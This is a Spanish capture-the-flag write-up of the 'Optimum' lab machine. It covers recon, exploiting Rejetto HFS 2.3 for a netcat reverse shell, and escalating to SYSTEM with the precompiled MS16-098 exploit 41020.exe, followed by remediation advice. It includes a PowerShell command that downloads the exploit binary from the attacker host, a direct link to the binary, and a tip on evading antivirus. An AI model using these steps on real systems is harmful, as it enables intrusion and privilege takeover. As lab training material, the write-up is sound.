Resumen

Optimum es una máquina sencilla de estas que te alegran el día nada ver que se trata de un HFS 2.3x vulnerable a rejetto, para la escalada es sencilla también mediante vulnerabilidades del Kernel

Vulnerabilidad

CVE-2014-6278 (Rejetto HTTP File Server)

Es una vulnerabilidad de ejecución remota de comandos en Rejetto HFS versiones 2.3x.

Ocurre por una validación deficiente al usar una macro de expresiones regulares con un byte nulo (%00), permitiendo ejecutar código arbitrario del sistema sin autenticación.

MS16-098 / CVE-2016-3309 - Exploit precompilado 41020.exe

Es el binario compilado de un exploit de escalada local de privilegios para el kernel de Windows (win32k.sys)

Aprovecha una vulnerabilidad de corrupción de memoria para permitir que un usuario sin privilegios ejecute código directamente como NT AUTHORITY\SYSTEM

Para mayor información consultar https://www.exploit-db.com/

Reconocimiento

Búsqueda de puertos abiertos en la máquina víctima

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p- -Pn -sS -n --max-retries 1 optimum
PuertoServicioVersión
80httpHttpFileServer httpd 2.3

Un único puerto abierto, el 80, sirviendo HttpFileServer httpd 2.3.

Enumeración

Enumeramos versiones y vulnerabilidades del servicio facilitado por la fase de reconocimiento

┌──(jaime㉿kali)-[~]└─$ sudo nmap -p 80 -n -sCV --script=http-vuln* --version-intensity 9 optimum
HttpFileServer httpd 2.3

Una vez detectado la versión concreta del servicio, buscamos en Internet o empleamos herramientas como searchsploit para sacar el exploit correcto. En este caso es el 39161.py

Explotación

La explotación es bastante sencilla, directamente descargamos el exploit o de https://www.exploit-db o con searchsploit

┌──(jaime㉿kali)-[~]└─$ searchsploit -m 39161.py

Una vez descargado leemos el exploit donde nos marcan 3 pasos imprescindibles a realizar para que funcione correctamente:

  1. Ajustar LocalHost al valor de la IP de nuestro ordenador así como el LocalPort que por defecto es el 443
  2. Levantar servidor en http://NuestraIPLocal:80 con nc.exe, para que lo use el exploit
  3. Ponernos en escucha

El Exploit aprovecha la vulnerabilidad de RCE para descargar el binario y obligar a la máquina víctima a conectarse a nuestro servidor web, descarga el nc.exe y lo guarda en el disco

Posteriormente, envía una segunda petición maliciosa para ejecutar el nc.exe recién descargado apuntando a nuestro puerto en escucha y otorgándonos una powershell con usuario kostas.

Escalada de privilegios

Siendo el usuario kostas, primeramente realizamos una post-explotación para conocer el entorno donde nos movemos, realizamos un systeminfo para poder copiarnos la información del sistema en un systeminfo.txt y tirarnos un suggester en local.

Tras ejecutar el suggester se nos muestran multitud de vulnerabilidades presentes, entre ellas, decido elegir

MS16-098 Security Update for Windows Kernel-Mode Drivers (3178466) - Important

En este exploit, aunque no ponga que es Privilege escalation, al ser un kernel-mode driver y un integer overflow en win32k.sys se dispara un proceso ya en la máquina y te sube a SYSTEM.

Entonces, simplemente descargamos el exploit de https://www.exploit-db.com/41020 donde al catearlo vemos que podemos o compilarlo nosotros, o descargarlo de un repositorio ya precompilado, optamos por la segunda opcion: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe

Levantamos servidor en local para desde la máquina víctima descargar el archivo .exe, importante hacerlo en el Desktop de kostas, ya que en Temp nos lo borra el AntiVirus

┌──(jaime㉿kali)-[~]└─$ powershell.exe wget "http://IPLocal/41020.exe" -OutFile "C:\Users\kostas\Desktop\41020.exe"

Ejecutamos y autómaticamente nos hacemos con root

Cómo se arregla

Todo parte de un software desactualizado y una falta de gestión de parches en el sistema operativo, así que el arreglo va por capas:

  • Actualizar Rejetto HFS: La solución inmediata es actualizar HFS a la versión 2.3c o superior (o migrar a una alternativa moderna y mantenida). Las versiones corregidas eliminan el fallo de inyección en las macros al sanear correctamente los caracteres nulos (%00).
  • Aplicar el parche MS16-098 (KB3178466): Microsoft corrigió esta vulnerabilidad en el subsistema del kernel (win32k.sys) en agosto de 2016. Mantener Windows Update activo y aplicar los boletines de seguridad mensuales elimina la posibilidad de escalar privilegios vía 41020.exe.
  • Principio de menor privilegio: Evitar ejecutar servicios web de cara al público bajo cuentas de usuario estándar interactivas con capacidad de escritura en rutas del sistema; es preferible emplear cuentas de servicio restringidas o contenedores aislados.
  • Segmentación y cortafuegos perimetral: No exponer servicios de gestión de ficheros directamente a Internet sin una capa previa de autenticación, proxy inverso o VPN, restringiendo además las conexiones salientes para dificultar el establecimiento de reverse shells.

Conclusiones

Mantener servicios obsoletos expuestos a la red es una sentencia inmediata: Rejetto HFS 2.3 arrastra vulnerabilidades públicas desde 2014 que permiten ejecución remota de código en cuestión de segundos y sin credenciales.

Es buena práctica, al identificar un banner web claro en el puerto 80, lanzar directamente searchsploit o scripts específicos de Nmap (--script=http-vuln*), lo que agiliza el acceso inicial sin necesidad de fuzzing exhaustivo.

El vector de escalada demuestra la importancia de la higiene en parches: el boletín MS16-098 llevaba años publicado cuando la máquina seguía vulnerable. En entornos Windows, recopilar la información básica con systeminfo y apoyarse en analizadores de parches revela caminos triviales hacia SYSTEM si la máquina carece de mantenimiento.
